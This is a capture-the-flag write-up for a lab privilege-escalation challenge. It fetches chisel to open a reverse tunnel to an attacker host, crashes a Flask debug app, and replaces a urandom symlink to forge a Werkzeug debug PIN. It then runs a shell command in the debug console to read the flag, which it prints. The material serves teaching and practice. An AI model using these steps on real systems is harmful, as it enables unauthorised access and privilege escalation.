# Drink from my Flask #2

### Category

System

### Description

Great job, you got acces to the machine ! But our dev has been working on an update. Can you leverage that to elevate your privileges ?

Format : **Hero{flag}**<br>
Author : **Log_s**

NB: This challenge is a sequel to Drink from my Flask #1. Start the same machine and continue from there.

### Write up

First things we notice on this machine, are the process running as flaskdev and the cron deamon running in background in addition to the exposed flask app.

```plain
$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root           7  0.0  0.0   3884  2520 pts/0    S+   13:38   0:00 cron -f
...
www-data      10  0.0  0.0 256932 29360 pts/1    Sl   13:38   0:00 /usr/bin/python3 app.py --port 80
...
flaskdev      30  0.0  0.0  36488 29872 ?        S    13:39   0:00 /usr/bin/python3 /var/www/dev/app.py
```

Our goal is to privesc to flaskdev. His home directory looks like this:

```plain$ ls -l /home/flaskdev
total 8
-r-------- 1 flaskdev flaskdev  31 Apr 12 11:36 flag.txt
-rw-rw-r-- 1 root     root     146 Apr 12 08:26 reboot_flask.sh
```

The `flag.txt` is only readable by flaskdev, that's for later. Let's take a look at the bash script.

```plain
if [ `ps -aux | grep -E ".*/usr/bin/python3 /var/www/dev/app.py" | wc -l` != "2" ]
then
    pkill python3 -U 1000
    /usr/bin/python3 /var/www/dev/app.py # This dev app is not exposed, it's ok to run it as myself  
fi
```

That script checks if `/var/www/app/app.py` is running, and if not, kills every owned python3 process and restarts the app. Since the cron deamon is running, it's pretty safe to assume that there is cronjob running this script at a regular interval (and since the challmaker is not a monster, it's running every minute).

There is subtility to note here. As we saw in the previous challenge, flaskdev is not the best developer there is. His mistake in this script was to check for every instance of the app running, regardless of the user who launched it, and to make a strict comparison to 2. This means that if we run the app with our current user, the script will find 3 lines in the output of `ps -aux`, and will kill it's own app, only to restart it moments later.

After taking a look at `/var/www/app/app.py`, we can see that the default running port is 5000, and that debugging is active. Let's forward the app to our attacking machine whith chisel.


Attacking machine:

```plain
./chisel server -p 8888 -reverse
```

Target:

```plain
curl -L -o /tmp/chisel.gz https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip /tmp/chisel.gz
chmod +x /tmp/chisel
/tmp/chisel client 172.17.0.1:8888 R:5000:localhost:5000&
```

In this example 172.17.0.1 is the IP of my attacking machine.

We're now able to access the internal dev app at http://localhost:5000.

The previous exploit seems to have been fixed, no ssti seems to work anymore.

Howerver, we know have access to the source code of the app.

A short anlysis of the flask app reveals a way to crash it.

```python
def divide(a, b):
    if b < 0:
        return "Error: Division by zero"
    return a / b
```

Indeed, there is yet another programming error. The script doesn't check if `b` is 0 but if it's smaller. A request like this one should crash the app and reveal the Flask console: http://localhost:5000/?op=divide&n1=1&n2=0.

However, the console is procted by a pin. This ressource explains how pins are generated, and how it's possible to craft one, when provided access to the right files: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

Trying blindly the method described on hacktricks won't work. Indeed, flaskdev modified the function that generates the pin. Let's take a look at it: `/usr/local/lib/python3.10/dist-packages/werkzeug/debug/__init__.py`

```python
def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        str(uuid.getnode()),
        get_machine_id(),
        open("/var/www/config/urandom", "rb").read(16) # ADDING EXTRA SECURITY TO PREVENT PIN FORGING
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

As you can see, the function was modfied, and a new private bit was added. We'll come back to it later.

The 4 public bits are classical.

```python
probably_public_bits = [
    'flaskdev',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]
```

There are 3 private bits. The two usual, and the random part.

For the first one, we can do the classical method explained on hacktricks that is to get the mac address and convert it to it's decimal value.

```plain
$ cat /sys/class/net/eth0/address
02:42:ac:11:00:02
$ python3 -c "print(int('02:42:ac:11:00:02'.replace(':',''), 16))"
2485377892354
```

Since we have a shell, we can also simply run the same python command as in the werkzeug script.

```plain
$ python3 -c "import uuid;print(str(uuid.getnode()))"
2485377892354
```

Our first private element is `2485377892354`.

For the second part, still following the hacktricks method or simply reading the source code, we look for the content of the `/etc/machine-id` and `/proc/self/cgroup` files.

```plain
$ cat /etc/machine-id
49bab8e92cca463691a8b330fc54cc89
$ cat /proc/self/cgroup
0::/
```

Since there is nothing after the second file's forward slash, our second private element is `49bab8e92cca463691a8b330fc54cc89`.

Finally the third part, that is our dear flaskdev's addition.

```python
open("/var/www/config/urandom", "rb").read(16)
```

This will read 16 bytes from `/var/www/config/urandom`.

```plain
$ ls -l /var/www/config/urandom
lrwxrwxrwx 1 root root 12 Apr 12 12:51 /var/www/config/urandom -> /dev/urandom
```

One look at it will tell us that it's a symlink to `/dev/urandom` that is linux's random number generator. There is no way to predict what were the 16 bytes present at the beginning of the file when the app was launched, since the content of this special file is constantly changing.

Fortunately for us, the folder `/var/www/config` is world writable. We can simply remove the symlink and replace it with a file that contains a fixed value controlled by us.

```plain
$ rm /var/www/config/urandom
$ echo "0000000000000000" > /var/www/config/urandom
```

Let's restart the app with the knowledge we acquired earlier when analysing the `reboot_flask.sh` script. We have to run the app on a different port, since 5000 is already in use.

```plain
$ /usr/bin/python3 /var/www/dev/app.py --port 9999
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:9999
```

After a minute, flaskdev's instance should have rebooted, we can kill our own.

Let's use the script found on hacktricks with our own values to forge a pin.

```plain
$ python3 forgePin.py                                                                       
142-003-671
```

We can now access the debugging console and get the flag.

```python
>>> import os ; os.popen('cat /home/flaskdev/flag.txt').read()
'Hero{n0t_s0_Urandom_4ft3r_4ll}\n'
```

### Flag

```Hero{n0t_s0_Urandom_4ft3r_4ll}```
